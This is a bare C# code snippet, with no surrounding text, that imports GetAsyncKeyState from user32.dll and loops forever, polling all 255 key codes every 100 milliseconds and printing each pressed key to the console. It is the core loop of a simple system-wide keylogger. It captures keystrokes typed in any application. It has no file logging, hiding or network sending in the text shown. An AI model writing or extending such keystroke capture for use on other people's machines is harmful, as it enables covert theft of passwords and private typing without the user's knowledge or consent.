[DllImport("user32.dll")]
 
public static extern int GetAsyncKeyState(Int32 i);

while (true)
{
Thread.Sleep(100);
for (Int32 i = 0; i < 255; i++)
{
int state = GetAsyncKeyState(i);
if (state == 1 || state == -32767)
{
Console.WriteLine((Keys)i);
 
}
}
}